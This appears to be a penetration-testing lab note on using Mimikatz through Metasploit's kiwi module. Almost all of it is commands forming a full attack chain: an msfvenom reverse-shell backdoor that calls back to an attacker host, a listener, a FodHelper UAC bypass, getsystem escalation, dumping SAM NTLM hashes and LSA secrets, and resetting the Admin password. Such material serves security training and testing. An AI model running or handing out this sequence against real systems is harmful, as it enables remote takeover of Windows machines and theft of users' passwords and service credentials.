# Mimikatz

Mimikatz is a post exploitation tool that enables users to save and view authentication credentials such as Kerberos tickets, dump passwords from memory, PINs, as well as hashes. It enables you to perform functions such as pass-the-hash, pass-the-ticket, and makes post exploitation lateral movement within a network. Use Metasploit inbuilt Mimikatz module which is also known as kiwi to dump Hashes from the target machine.

## Create the PE to send to the target

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/backdoor.exe
```

## Set up listener

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost VALUE
set lport VALUE
run
```

> Open victim machine and execute it

## Bypass UAC

Bypass Windows UAC protection via **FodHelper Registry Key**

```
use exploit/windows/local/bypassuac_fodhelper
set session 1
show options
exploit
```

> when get the system, do

```
getsystem -t 1     # get system via Pipe Impersonation
getuid             # fetch the server username
```

## Use MIMIKATZ

```
load kiwi          # load the mimikatz
help kiwi          # help instruction
lsa_dump_sam       # load NTLM hash of all users
lsa_dump_secrets   
```

> **LSA secrets** are used to manage a systemâ€™s local security policy, and contain sensitive data such as User passwords, IE passwords, service account passwords, SQL passwords, etc.

## Change Password

The NTLM hash of Admin is received from the previous step.

```
password_change -u Admin -n [NTLM hash of Admin] -P password
```

Check the new hash value by typing **lsa\_dump\_sam** to load NTLM hashes of all users. The NTLM hash matched with our new password.
